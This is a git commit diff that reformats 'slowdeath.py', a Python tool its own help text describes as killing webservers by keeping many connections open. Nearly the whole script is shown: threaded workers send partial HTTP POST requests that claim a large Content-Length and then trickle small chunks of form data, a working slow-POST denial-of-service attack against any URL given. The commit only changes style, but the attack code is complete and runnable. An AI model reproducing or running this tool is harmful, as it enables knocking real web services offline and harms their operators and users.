e0e4bc33603c2778220db6834db78e3a996e235c
Andrew Pennebaker <andrew.pennebaker@gmail.com>
2011-07-31 18:53:07 -0400

    Improved code with PyChecker

--- slowdeath.py
+++ slowdeath.py
@@ -8,12 +8,13 @@ import threading
 
 def openConnections(url, threads, sleepTime) :
 	urlParts = urlparse(url)
-	if (urlParts.scheme != 'http'):
-		raise Exception('Only the http protocol is currently supported')
+	if (urlParts.scheme != "http"):
+		raise Exception("Only the http protocol is currently supported")
 
 	port = urlParts.port
 
-	if port == None: port = 80
+	if port == None:
+		port = 80
 
 	print "Opening %d sockets to %s:%d" % (threads, urlParts.hostname, port)
 
@@ -29,7 +30,7 @@ def openConnections(url, threads, sleepTime) :
 
 		while True: sleep(1)
 
-	except KeyboardInterrupt, e:
+	except KeyboardInterrupt:
 		print "\nCaught keyboard interrupt. Stopping all threads"
 
 		for worker in pool: worker.stop()
@@ -38,12 +39,12 @@ def openConnections(url, threads, sleepTime) :
 
 class Worker (threading.Thread):
 	def __init__(self, host, port, path, sleepTime) :
-	    self.host = host
-	    self.port = port
-	    self.path = path
-	    self.sleepTime = sleepTime
-	    self.stopped = False
-	    threading.Thread.__init__(self)
+		self.host = host
+		self.port = port
+		self.path = path
+		self.sleepTime = sleepTime
+		self.stopped = False
+		threading.Thread.__init__(self)
 
 	def stop(self): self.stopped = True
 
@@ -52,46 +53,48 @@ class Worker (threading.Thread):
 		s.connect((self.host, self.port))
 		s.settimeout(1)
 		s.send(
-		    'POST ' + self.path + ' HTTP/1.1\r\n' +
-		    'Host: ' + self.host + '\r\n' +
-		    'Connection: close\r\n' +
-		    'Content-Length: 1000000\r\n' +
-		    '\r\n'
+			"POST " + self.path + " HTTP/1.1\r\n" +
+			"Host: " + self.host + "\r\n" +
+			"Connection: close\r\n" +
+			"Content-Length: 1000000\r\n" +
+			"\r\n"
 		)
 
 		while not self.stopped:
-			s.send('abc=123&')
+			s.send("abc=123&")
 			sleep(self.sleepTime/1000) 
 
 		s.close
 
 def main():
 	parser = OptionParser(
-	    version="slowdeath v0.1",
-	    description="Kills webservers by keeping many connections open, avoiding timeouts.",
-	    usage="usage: %prog [options] url",
+		version="slowdeath v0.1",
+		description="Kills webservers by keeping many connections open, avoiding timeouts.",
+		usage="usage: %prog [options] url",
 	)
 	parser.add_option(
-	    '-t','--threads',
-	    help="Number of connections to keep open (default = 100)",
-	    type="int",
-	    dest="threads",
-	    default=100
+		"-t","--threads",
+		help="Number of connections to keep open (default = 100)",
+		type="int",
+		dest="threads",
+		default=100
 	)
 	parser.add_option(
-	    '-s','--sleep',
-	    help="Time in between packages in millisenconds (default = 1000)",
-	    type="int",
-	    dest="sleepTime",
-	    default=1000
+		"-s","--sleep",
+		help="Time in between packages in millisenconds (default = 1000)",
+		type="int",
+		dest="sleepTime",
+		default=1000
 	)
 
 	options,args = parser.parse_args()
 
-	if len(args) < 1: parser.error("This utility requires at least 1 argument")
+	if len(args) < 1:
+		parser.error("This utility requires at least 1 argument")
 
 	url = args[0]
 
 	openConnections(url, options.threads, options.sleepTime)
 
-if __name__ == '__main__': main()
+if __name__ == "__main__":
+	main()
